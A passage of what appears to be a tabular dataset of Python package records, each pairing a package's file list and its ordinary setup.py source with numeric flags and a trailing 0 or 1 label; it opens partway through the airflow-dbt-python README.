Airflow deployment, including most production deployments as they are usually running [Remote Executors](https://airflow.apache.org/docs/apache-airflow/stable/executor/index.html#executor-types) and do not guarantee any files will be shared by default between tasks, since each task may run in a completely different environment.\n\n\n## Download dbt files from S3\n\nThe dbt parameters `profiles_dir` and `project_dir` would normally point to a directory containing a `profiles.yml` file and a dbt project in the local environment respectively (defined by the presence of a `dbt_project.yml` file). airflow-dbt-python extends these parameters to also accept an [AWS S3](https://aws.amazon.com/s3/) URL (identified by a `s3://` scheme):\n\n* If an S3 URL is used for `profiles_dir`, then this URL must point to a directory in S3 that contains a `profiles.yml` file. The `profiles.yml` file will be downloaded and made available for the operator to use when running.\n* If an S3 URL is used for `project_dir`, then this URL must point to a directory in S3 containing all the files required for a dbt project to run. All of the contents of this directory will be downloaded and made available for the operator. The URL may also point to a zip file containing all the files of a dbt project, which will be downloaded, uncompressed, and made available for the operator.\n\nThis feature is intended to work in line with Airflow\'s [description of the task concept](https://airflow.apache.org/docs/apache-airflow/stable/concepts/tasks.html#relationships):\n\n> Tasks don’t pass information to each other by default, and run entirely independently.\n\nIn our world, that means task should be responsible of fetching all the dbt related files it needs in order to run independently, as already described in [Independent Task Execution](#independent-task-execution).\n\nAs of the time of writing S3 is the only supported backend for dbt projects, but we have plans to extend this to support more backends, initially targeting other file storages that are commonly used in Airflow connections.\n\n## Push dbt artifacts to XCom\n\nEach dbt execution produces one or more [JSON artifacts](https://docs.getdbt.com/reference/artifacts/dbt-artifacts/) that are valuable to produce meta-metrics, build conditional workflows, for reporting purposes, and other uses. airflow-dbt-python can push these artifacts to [XCom](https://airflow.apache.org/docs/apache-airflow/stable/concepts/xcoms.html) as requested via the `do_xcom_push_artifacts` parameter, which takes a list of artifacts to push.\n\n## Use Airflow connections as dbt targets (without a profiles.yml)\n\n[Airflow connections](https://airflow.apache.org/docs/apache-airflow/stable/howto/connection.html) allow users to manage and store connection information, such as hostname, port, user name, and password, for operators to use when accessing certain applications, like databases. Similarly, a dbt `profiles.yml` file stores connection information under each target key. `airflow-dbt-python` bridges the gap between the two and allows you to use connection information stored as an Airflow connection by specifying the connection id as the `target` parameter of any of the dbt operators it provides. What\'s more, if using an Airflow connection, the `profiles.yml` file may be entirely omitted (although keep in mind a `profiles.yml` file contains a configuration block besides target connection information).\n\nSee an example DAG [here](examples/airflow_connection_target_dag.py).\n\n# Motivation\n\n## Airflow running in a managed environment\n\nAlthough [`dbt`](https://docs.getdbt.com/) is meant to be installed and used as a CLI, we may not have control of the environment where Airflow is running, disallowing us the option of using `dbt` as a CLI.\n\nThis is exactly what happens when using [Amazon\'s Managed Workflows for Apache Airflow](https://aws.amazon.com/managed-workflows-for-apache-airflow/) or MWAA: although a list of Python requirements can be passed, the CLI cannot be found in the worker\'s PATH.\n\nThere is a workaround which involves using Airflow\'s `BashOperator` and running Python from the command line:\n\n``` python\nfrom airflow.operators.bash import BashOperator\n\nBASH_COMMAND = ""python -c \'from dbt.main import main; main()\' run""\noperator = BashOperator(\n    task_id=""dbt_run"",\n    bash_command=BASH_COMMAND,\n)\n```\n\nBut it can get sloppy when appending all potential arguments a `dbt run` command (or other subcommand) can take.\n\nThat\'s where `airflow-dbt-python` comes in: it abstracts the complexity of interfacing with `dbt-core` and exposes one operator for each `dbt` subcommand that can be instantiated with all the corresponding arguments that the `dbt` CLI would take.\n\n## An alternative to `airflow-dbt` that works without the dbt CLI\n\nThe alternative [`airflow-dbt`](https://pypi.org/project/airflow-dbt/) package, by default, would not work if the `dbt` CLI is not in PATH, which means it would not be usable in MWAA. There is a workaround via the `dbt_bin` argument, which can be set to `""python -c \'from dbt.main import main; main()\' run""`, in similar fashion as the `BashOperator` example. Yet this approach is not without its limitations:\n* `airflow-dbt` works by wrapping the `dbt` CLI, which makes our code dependent on the environment in which it runs.\n* `airflow-dbt` does not support the full range of arguments a command can take. For example, `DbtRunOperator` does not have an attribute for `fail_fast`.\n* `airflow-dbt` does not offer access to `dbt` artifacts created during execution. `airflow-dbt-python` does so by pushing any artifacts to [XCom](https://airflow.apache.org/docs/apache-airflow/stable/concepts/xcoms.html).\n\n# Usage\n\nCurrently, the following `dbt` commands are supported:\n\n* `clean`\n* `compile`\n* `debug`\n* `deps`\n* `docs generate`\n* `ls`\n* `parse`\n* `run`\n* `run-operation`\n* `seed`\n* `snapshot`\n* `source`\n* `test`\n\n## Examples\n\nAll example DAGs are tested against against `apache-airflow==2.2.5`. Some changes, like modifying `import` statements or changing types, may be required for them to work in other versions.\n\n``` python\nfrom datetime import timedelta\n\nfrom airflow import DAG\nfrom airflow.utils.dates import days_ago\nfrom airflow_dbt_python.operators.dbt import (\n    DbtRunOperator,\n    DbtSeedOperator,\n    DbtTestoperator,\n)\n\nargs = {\n    \'owner\': \'airflow\',\n}\n\nwith DAG(\n    dag_id=\'example_dbt_operator\',\n    default_args=args,\n    schedule_interval=\'0 0 * * *\',\n    start_date=days_ago(2),\n    dagrun_timeout=timedelta(minutes=60),\n    tags=[\'example\', \'example2\'],\n) as dag:\n    dbt_test = DbtTestOperator(\n        task_id=""dbt_test"",\n        selector_name=[""pre-run-tests""],\n    )\n\n    dbt_seed = DbtSeedOperator(\n        task_id=""dbt_seed"",\n        select=[""/path/to/first.csv"", ""/path/to/second.csv""],\n        full_refresh=True,\n    )\n\n    dbt_run = DbtRunOperator(\n        task_id=""dbt_run"",\n        select=[""/path/to/models""],\n        full_refresh=True,\n        fail_fast=True,\n    )\n\n    dbt_test >> dbt_seed >> dbt_run\n```\n\nMore examples can be found in the [`examples/`](examples/) directory and the [documentation](https://tomasfarias.github.io/airflow-dbt-python/example_dags.html).\n\n# Testing\n\nTests are written using `pytest`, can be located in `tests/`, and they can be run locally with `poetry`:\n\n``` shell\npoetry run pytest tests/ -vv\n```\n\nSee development and testing instructions in the [documentation](https://tomasfarias.github.io/airflow-dbt-python/development.html).\n\n# License\n\nThis project is licensed under the MIT license. See ![LICENSE](LICENSE).\n',
    'author': 'Tomás Farías Santana',
    'author_email': 'tomas@tomasfarias.dev',
    'maintainer': 'None',
    'maintainer_email': 'None',
    'url': 'https://github.com/tomasfarias/airflow-dbt-python',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'extras_require': extras_require,
    'python_requires': '>=3.7.2,<3.11.0',
}


setup(**setup_kwargs)
",0
airflow-exporter-1.5.3,1,1,1,0,1,0,0,0,test.yml .gitignore prometheus_exporter.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md CONTRIBUTING.md LICENSE PKG-INFO pyproject.toml README.md run_test.sh setup.cfg setup.py .gitignore airflow.cfg dummy_dag.py slow_dag.py docker-compose.yml test_metrics_up.py,"from os import path

from setuptools import setup

root_dir = path.abspath(path.dirname(__file__))

readme_file = path.join(root_dir, ""README.md"")
with open(readme_file) as f:
    readme = f.read()

setup(
    name=""airflow-exporter"",
    use_scm_version=True,
    description=""Airflow plugin to export dag and task based metrics to Prometheus."",
    long_description=readme,
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Environment :: Web Environment"",
        ""Intended Audience :: System Administrators"",
        ""Natural Language :: English"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 3"",
        ""Topic :: System :: Monitoring"",
    ],
    keywords=""airflow plugin prometheus exporter metrics"",
    url=""https://github.com/epoch8/airflow-exporter"",
    packages=[""airflow_exporter""],
    setup_requires=[""setuptools_scm""],
    install_requires=[
        ""apache-airflow>=2.0.0"",
        ""prometheus_client>=0.4.2"",
    ],
    entry_points={
        ""airflow.plugins"": [
            ""AirflowPrometheus = airflow_exporter.prometheus_exporter:AirflowPrometheusPlugins""
        ]
    },
)
",0
airflow_prometheus_exporter-1.0.8,0,1,1,1,0,0,0,0,config.yaml prometheus_exporter.py xcom_config.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""The setup script.""""""

from setuptools import setup, find_packages

with open('README.md', encoding='utf-8') as readme_file:
    readme = readme_file.read()

install_requirements = [
    'apache-airflow>=1.10.4',
    'prometheus_client>=0.4.2',
],

extras_require={
    'dev': [
        'bumpversion',
        'tox',
        'twine',
    ]
}

setup(
    author='Robinhood Markets, Inc.',
    author_email='open-source@robinhood.com',
    classifiers=[
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Natural Language :: English',
        'Programming Language :: Python :: 3 :: Only',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
    ],
    description='Prometheus Exporter for Airflow Metrics',
    install_requires=install_requirements,
    extras_require=extras_require,
    license='BSD 3-Clause',
    long_description=readme,
    long_description_content_type='text/markdown',
    keywords='airflow_prometheus_exporter',
    name='airflow_prometheus_exporter',
    packages=find_packages(include=['airflow_prometheus_exporter']),
    include_package_data=True,
    url='https://github.com/robinhood/airflow_prometheus_exporter',
    version='1.0.8',
    entry_points={
        'airflow.plugins': [
            'AirflowPrometheus = airflow_prometheus_exporter.prometheus_exporter:AirflowPrometheusPlugin'
        ]
    },
)
",0
airflow-provider-great-expectations-0.1.4,0,1,1,0,1,0,1,0,dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt example_great_expectations_dag.py __init__.py great_expectations.py __init__.py __init__.py LICENSE.md PKG-INFO README.md setup.cfg setup.py,"import setuptools

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""airflow-provider-great-expectations"",
    version=""0.1.4"",
    author=""Great Expectations"",
    description=""An Apache Airflow provider for Great Expectations"",
    entry_points=""""""
        [apache_airflow_provider]
        provider_info=great_expectations_provider.__init__:get_provider_info
    """""",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/great-expectations/airflow-provider-great-expectations"",
    install_requires=[
        ""apache-airflow>=2.1"",
        ""great-expectations>=0.13.14"",
        ""sqlalchemy>=1.3.16,<1.4.10"",
    ],
    packages=[
        ""great_expectations_provider"",
        ""great_expectations_provider.operators"",
        ""great_expectations_provider.example_dags"",
    ],
    python_requires="">=3.6"",
    include_package_data=True,
)
",1
airtable-python-wrapper-0.15.3,0,1,1,1,0,0,0,0,airtable.py auth.py params.py __init__.py __version__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt HISTORY.md LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py test.py tox.ini,"from setuptools import setup
import os

here = os.path.abspath(os.path.dirname(__file__))

about = {}
with open(os.path.join(here, ""airtable"", ""__version__.py""), mode=""r"") as f:
    exec(f.read(), about)

setup_requires = [""pytest-runner""]
install_requires = [""requests>=2""]
tests_require = [""requests-mock"", ""requests"", ""mock"", ""pytest""]

setup(
    name=about[""__name__""],
    description=about[""__description__""],
    author=about[""__author__""],
    author_email=about[""__authoremail__""],
    url=about[""__url__""],
    version=about[""__version__""],
    packages=[""airtable""],
    setup_requires=setup_requires,
    install_requires=install_requires,
    tests_require=tests_require,
    python_requires=""!=2.7.*, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*"",
    keywords=[""airtable"", ""api""],
    license=about[""__license__""],
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Topic :: Software Development"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: Implementation :: CPython"",
    ],
)
",1
ajsonrpc-1.2.0,1,1,1,1,1,0,1,0,common.py quart.py sanic.py tornado.py __init__.py core.py dispatcher.py manager.py server.py test_core.py test_dispatcher.py test_manager.py __init__.py utils.py __init__.py dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
import os.path
from setuptools import setup
from collections import OrderedDict
from ajsonrpc import __version__


def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()


setup(
    name=""ajsonrpc"",
    version=__version__,
    url=""https://github.com/pavlov99/ajsonrpc"",
    project_urls=OrderedDict((
        (""Documentation"", ""https://ajsonrpc.readthedocs.io""),
        (""Code"", ""https://github.com/pavlov99/ajsonrpc""),
        (""Issue tracker"", ""https://github.com/pavlov99/ajsonrpc/issues""),
    )),
    license=""MIT"",
    author=""Kirill Pavlov"",
    author_email=""k@p99.io"",
    packages=[""ajsonrpc""],
    entry_points = {
        ""console_scripts"": [
            ""async-json-rpc-server=ajsonrpc.scripts.server:main"",
        ],
    },
    include_package_data=True,
    platforms=""any"",
    python_requires='>=3.5',
    description=""Async JSON-RPC 2.0 protocol + server powered by asyncio"",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Framework :: AsyncIO"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Natural Language :: English"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ],
)
",1
alabaster-0.7.12,0,1,1,1,0,0,0,0,about.html donate.html layout.html navigation.html relations.html alabaster.css_t custom.css support.py theme.conf _version.py __init__.py dependency_links.txt entry_points.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python

import codecs
from setuptools import setup

# Version info -- read without importing
_locals = {}
with open(""alabaster/_version.py"") as fp:
    exec(fp.read(), None, _locals)
version = _locals[""__version__""]

# README into long description
with codecs.open(""README.rst"", encoding=""utf-8"") as f:
    readme = f.read()

setup(
    name=""alabaster"",
    version=version,
    description=""A configurable sidebar-enabled Sphinx theme"",
    long_description=readme,
    author=""Jeff Forcier"",
    author_email=""jeff@bitprophet.org"",
    url=""https://alabaster.readthedocs.io"",
    packages=[""alabaster""],
    include_package_data=True,
    entry_points={""sphinx.html_themes"": [""alabaster = alabaster""]},
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: BSD License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.6"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Topic :: Documentation"",
        ""Topic :: Software Development :: Documentation"",
    ],
)
",1
Alarmageddon-1.1.2,0,1,1,1,0,0,1,0,banner.py config.py emailer.py exceptions.py graphite.py hipchat.py http.py junit.py pagerduty.py publisher.py slack.py teams.py __init__.py reporter.py result.py run.py cassandra.py exceptions.py graphite.py graphite_expectations.py http.py http_expectations.py json_expectations.py kafka.py rabbitmq.py ssh.py utilities.py validation.py __init__.py __init__.py LICENSE METADATA RECORD top_level.txt WHEEL,,1
albumentations-1.2.1,0,1,1,0,1,0,0,0,functional.py transforms.py __init__.py domain_adaptation.py channel_dropout.py coarse_dropout.py cutout.py functional.py grid_dropout.py mask_dropout.py __init__.py functional.py functional.py resize.py rotate.py transforms.py __init__.py transforms.py utils.py __init__.py bbox_utils.py composition.py keypoints_utils.py serialization.py transforms_interface.py utils.py __init__.py stubs.py transforms.py __init__.py functional.py transforms.py __init__.py random_utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt benchmark.py Dockerfile README.md requirements.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py conftest.py output_v1.1.0_without_totensor.json output_v1.1.0_with_totensor.json transform_serialization_v2_without_totensor.json transform_serialization_v2_with_totensor.json transform_v1.1.0_without_totensor.json transform_v1.1.0_with_totensor.json test_augmentations.py test_bbox.py test_core.py test_functional.py test_imgaug.py test_imgaug_imports.py test_keypoint.py test_pytorch.py test_random.py test_serialization.py test_transforms.py utils.py __init__.py,"import io
import os
import re

from pkg_resources import DistributionNotFound, get_distribution
from setuptools import find_packages, setup

INSTALL_REQUIRES = [""numpy>=1.11.1"", ""scipy"", ""scikit-image>=0.16.1"", ""PyYAML"", ""qudida>=0.0.4""]

# If none of packages in first installed, install second package
CHOOSE_INSTALL_REQUIRES = [
    (
        (""opencv-python>=4.1.1"", ""opencv-contrib-python>=4.1.1"", ""opencv-contrib-python-headless>=4.1.1""),
        ""opencv-python-headless>=4.1.1"",
    )
]


def get_version():
    current_dir = os.path.abspath(os.path.dirname(__file__))
    version_file = os.path.join(current_dir, ""albumentations"", ""__init__.py"")
    with io.open(version_file, encoding=""utf-8"") as f:
        return re.search(r'^__version__ = [\'""]([^\'""]*)[\'""]', f.read(), re.M).group(1)


def get_long_description():
    base_dir = os.path.abspath(os.path.dirname(__file__))
    with io.open(os.path.join(base_dir, ""README.md""), encoding=""utf-8"") as f:
        return f.read()


def choose_requirement(mains, secondary):
    """"""If some version of main requirement installed, return main,
    else return secondary.

    """"""
    chosen = secondary
    for main in mains:
        try:
            name = re.split(r""[!<>=]"", main)[0]
            get_distribution(name)
            chosen = main
            break
        except DistributionNotFound:
            pass

    return str(chosen)


def get_install_requirements(install_requires, choose_install_requires):
    for mains, secondary in choose_install_requires:
        install_requires.append(choose_requirement(mains, secondary))

    return install_requires


setup(
    name=""albumentations"",
    version=get_version(),
    description=""Fast image augmentation library and easy to use wrapper around other libraries"",
    long_description=get_long_description(),
    long_description_content_type=""text/markdown"",
    author=""Buslaev Alexander, Alexander Parinov, Vladimir Iglovikov, Eugene Khvedchenya, Druzhinin Mikhail"",
    license=""MIT"",
    url=""https://github.com/albumentations-team/albumentations"",
    packages=find_packages(exclude=[""tests""]),
    python_requires="">=3.6"",
    install_requires=get_install_requirements(INSTALL_REQUIRES, CHOOSE_INSTALL_REQUIRES),
    extras_require={""tests"": [""pytest""], ""imgaug"": [""imgaug>=0.4.0""], ""develop"": [""pytest"", ""imgaug>=0.4.0""]},
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved :: MIT License"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: Science/Research"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ],
)
",0
alchemy-mock-0.4.3,0,1,1,0,1,0,0,0,comparison.py compat.py mocking.py unittests.py utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS.rst HISTORY.rst LICENSE.rst MANIFEST.in PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import absolute_import, print_function, unicode_literals
import os

from setuptools import find_packages, setup

from alchemy_mock import __author__, __description__, __version__


def read(fname):
    return (
        open(os.path.join(os.path.dirname(__file__), fname), ""rb"")
        .read()
        .decode(""utf-8"")
    )


authors = read(""AUTHORS.rst"")
history = read(""HISTORY.rst"").replace("".. :changelog:"", """")
licence = read(""LICENSE.rst"")
readme = read(""README.rst"")

requirements = read(""requirements.txt"").splitlines() + [""setuptools""]

test_requirements = (
    read(""requirements.txt"").splitlines()
    + read(""requirements-dev.txt"").splitlines()[1:]
)

setup(
    name=""alchemy-mock"",
    version=__version__,
    author=__author__,
    description=__description__,
    long_description=""\n\n"".join([readme, history, authors, licence]),
    url=""https://github.com/miki725/alchemy-mock"",
    license=""MIT"",
    packages=find_packages(exclude=[""test"", ""test.*""]),
    install_requires=requirements,
    tests_require=test_requirements,
    keywords="" "".join([""sqlalchemy"", ""mock"", ""testing""]),
    classifiers=[
        ""Intended Audience :: Developers"",
        ""Natural Language :: English"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Development Status :: 2 - Pre-Alpha"",
    ],
)
",1
ale_py-0.7.5,0,1,1,1,1,0,1,0,gym.py libSDL2-2.0.dylib py.typed tetris.bin utils.py __init__.py import_roms.py __init__.py _ale_py.cpython-310-darwin.so __init__.py entry_points.txt LICENSE.md METADATA RECORD top_level.txt WHEEL environment.py __init__.py,,1
alembic-1.8.1,0,1,1,1,0,0,0,0,api.py compare.py render.py rewriter.py __init__.py command.py config.py context.py context.pyi base.py impl.py mssql.py mysql.py oracle.py postgresql.py sqlite.py __init__.py environment.py migration.py op.py op.pyi base.py batch.py ops.py schemaobj.py toimpl.py __init__.py py.typed environment.py migration.py __init__.py base.py revision.py write_hooks.py __init__.py alembic.ini.mako env.py README script.py.mako alembic.ini.mako env.py README script.py.mako alembic.ini.mako env.py README script.py.mako assertions.py env.py fixtures.py bootstrap.py __init__.py requirements.py schemacompare.py test_autogen_comments.py test_autogen_computed.py test_autogen_diffs.py test_autogen_fks.py test_autogen_identity.py test_environment.py test_op.py _autogen_fixtures.py __init__.py util.py warnings.py __init__.py compat.py editor.py exc.py langhelpers.py messaging.py pyfiles.py sqla_compat.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES autogenerate.html commands.html config.html ddl.html index.html operations.html overview.html runtime.html script.html autogenerate.html batch.html branches.html api_overview.png autogenerate.rst commands.rst config.rst ddl.rst index.rst operations.rst overview.rst runtime.rst script.rst autogenerate.rst batch.rst branches.rst changelog.rst conf.py cookbook.rst front.rst index.rst Makefile naming.rst offline.rst ops.rst requirements.txt tutorial.rst README.txt nature_override.css site_custom_css.css site_custom_sidebars.html changelog.html cookbook.html front.html genindex.html index.html naming.html offline.html ops.html py-modindex.html search.html searchindex.js tutorial.html api_overview.png autogenerate.rst.txt commands.rst.txt config.rst.txt ddl.rst.txt index.rst.txt operations.rst.txt overview.rst.txt runtime.rst.txt script.rst.txt autogenerate.rst.txt batch.rst.txt branches.rst.txt changelog.rst.txt cookbook.rst.txt front.rst.txt index.rst.txt naming.rst.txt offline.rst.txt ops.rst.txt tutorial.rst.txt basic.css changelog.css clipboard.min.js copybutton.css copybutton.js copybutton_funcs.js doctools.js documentation_options.js file.png jquery-3.6.0.js jquery.js language_data.js minus.png nature.css nature_override.css plus.png pygments.css searchtools.js site_custom_css.css sphinx_paramlinks.css underscore-1.13.1.js underscore.js _sphinx_javascript_frameworks_compat.js LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst README.unittests.rst setup.cfg setup.py conftest.py requirements.py test_autogen_composition.py test_autogen_diffs.py test_autogen_indexes.py test_autogen_render.py test_batch.py test_bulk_insert.py test_command.py test_config.py test_editor.py test_environment.py test_external_dialect.py test_impl.py test_mssql.py test_mysql.py test_offline_environment.py test_op.py test_op_naming_convention.py test_oracle.py test_postgresql.py test_post_write.py test_revision.py test_script_consumption.py test_script_production.py test_sqlite.py test_stubs.py test_suite.py test_version_table.py test_version_traversal.py _large_map.py __init__.py write_pyi.py tox.ini,"from setuptools import __version__
from setuptools import setup

if not int(__version__.partition(""."")[0]) >= 47:
    raise RuntimeError(f""Setuptools >= 47 required. Found {__version__}"")

setup()
",0
AlexaPy-1.26.1,0,1,1,1,1,0,1,0,abc.py base_protocol.py client.py client_exceptions.py client_proto.py client_reqrep.py client_ws.py connector.py cookiejar.py formdata.py hdrs.py helpers.py http.py http_exceptions.py http_parser.py http_websocket.py http_writer.py locks.py log.py multipart.py payload.py payload_streamer.py py.typed pytest_plugin.py resolver.py streams.py tcp_helpers.py test_utils.py tracing.py typedefs.py web.py web_app.py web_exceptions.py web_fileresponse.py web_log.py web_middlewares.py web_protocol.py web_request.py web_response.py web_routedef.py web_runner.py web_server.py web_urldispatcher.py web_ws.py worker.py _cparser.pxd _find_header.h _find_header.pxd _helpers.pyi _helpers.pyx _http_parser.pyx _http_writer.pyx _websocket.pyx __init__.py alexaapi.py alexalogin.py alexaproxy.py alexawebsocket.py const.py errors.py helpers.py __init__.py LICENSE PKG-INFO pyproject.toml README.md setup.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['alexapy', 'alexapy.aiohttp']

package_data = \
{'': ['*']}

install_requires = \
['aiofiles>0,<1',
 'authcaptureproxy>=1.1.4,<2.0.0',
 'backoff>=1.10',
 'beautifulsoup4',
 'certifi',
 'cryptography>=35.0',
 'pyotp>=2.4',
 'requests',
 'simplejson',
 'yarl']

setup_kwargs = {
    'name': 'alexapy',
    'version': '1.26.1',
    'description': 'Python API to control Amazon Echo Devices Programmatically.',
    'long_description': '# alexapy\n\n[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)\n[![Python version compatibility](https://img.shields.io/pypi/pyversions/alexapy)](https://pypi.org/project/alexapy)\n[![Version on PyPi](https://img.shields.io/pypi/v/alexapy)](https://pypi.org/project/alexapy)\n[![pipeline status](https://gitlab.com/keatontaylor/alexapy/badges/master/pipeline.svg)](https://gitlab.com/keatontaylor/alexapy/commits/master)\n![PyPI - Downloads](https://img.shields.io/pypi/dd/alexapy)\n![PyPI - Downloads](https://img.shields.io/pypi/dw/alexapy)\n![PyPI - Downloads](https://img.shields.io/pypi/dm/alexapy)\n\nPython Package for controlling Alexa devices (echo dot, etc) programmatically. This was originally designed for [alexa_media_player](https://github.com/custom-components/alexa_media_player) a custom_component for [Home Assistant](https://www.home-assistant.io/).\n\n**NOTE:** Alexa has no official API; therefore, this library may stop\nworking at any time without warning.\n\n# Credits\nOriginally inspired by [this blog](https://blog.loetzimmer.de/2017/10/amazon-alexa-hort-auf-die-shell-echo.html) [(GitHub)](https://github.com/thorsten-gehrig/alexa-remote-control).\nAdditional scaffolding from [simplisafe-python](https://github.com/bachya/simplisafe-python)\n\n# Contributing\n\n1.  [Check for open features/bugs](https://gitlab.com/keatontaylor/alexapy/issues)\n  or [initiate a discussion on one](https://gitlab.com/keatontaylor/alexapy/issues/new).\n2.  [Fork the repository](https://gitlab.com/keatontaylor/alexapy/forks/new).\n3.  Install the dev environment: `make init`.\n4.  Enter the virtual environment: `pipenv shell`\n5.  Code your new feature or bug fix.\n6.  Write a test that covers your new functionality.\n7.  Update `README.md` with any new documentation.\n8.  Run tests and ensure 100% code coverage for your contribution: `make coverage`\n9.  Ensure you have no linting errors: `make lint`\n10. Ensure you have typed your code correctly: `make typing`\n11. Add yourself to `AUTHORS.md`.\n12. Submit a pull request!\n\n# License\n[Apache-2.0](LICENSE). By providing a contribution, you agree the contribution is licensed under Apache-2.0.\n\n# API Reference\n[See the docs 📚](https://alexapy.readthedocs.io/en/latest/index.html).\n',
    'author': 'Keaton Taylor',
    'author_email': 'keatonstaylor@gmail.com',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://gitlab.com/keatontaylor/alexapy',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'python_requires': '>=3.8,<4.0',
}


setup(**setup_kwargs)
",1
algoliasearch-2.6.2,0,1,1,1,1,0,0,0,account_client.py analytics_client.py analytics_client_async.py configs.py exceptions.py helpers.py helpers_async.py hosts.py requester.py requester_async.py request_options.py serializer.py transporter.py transporter_async.py verb.py __init__.py insights_client.py insights_client_async.py iterators.py iterators_async.py personalization_client.py personalization_client_async.py recommendation_client.py recommendation_client_async.py recommend_client.py recommend_client_async.py responses.py search_client.py search_client_async.py search_index.py search_index_async.py user_agent.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

from setuptools import setup

setup()
",1
algopy-0.5.7,0,1,1,1,0,0,0,0,base_type.py compound.py exact_interpolation.py fft.py __init__.py globalfuncs.py compound.py linalg.py __init__.py nthderiv.py __init__.py compound.py special.py __init__.py test_compound.py test_exact_interpolation.py test_examples.py test_globalfuncs.py test_linalg.py test_npversion.py test_nthderiv.py test_operators.py test_special.py test_utils.py __init__.py environment.py test_future_division.py __init__.py test_tracer.py test_tracer_complex.py __init__.py tracer.py __init__.py utils.py algorithms.py test_algorithms.py test_special_function_identities.py test_utpm.py test_utpm_complex.py test_utpm_convenience.py __init__.py utpm.py __init__.py version.py _npversion.py _six.py __init__.py example1_qr.py example2_qr_numerical_stability.py example3_qr_for_moore_penrose_pseudo_inverse.py example4_eigh.py example5_code_tracing_with_pyadolc.py example6_utps_simple_function.py example7_simple_computation_of_the_hessian.py example8_reverse_simple_function.py example9_explicit_euler.py prettyplotting.py comparison_forward_reverse_mode.py covariance_matrix_computation.py differentiation_of_the_symmetric_eigenvalue_decomposition.py error_propagation.py hessian_computation_in_combined_forward_reverse_mode.py moore_penrose_pseudoinverse.py numpy_compatibility.py getting_started.py accuracy_and_runtime_check.py accuracy_of_eigh_for_large_matrices.py algopy_vs_pyadolc.py degenerated_eigenvalues.py 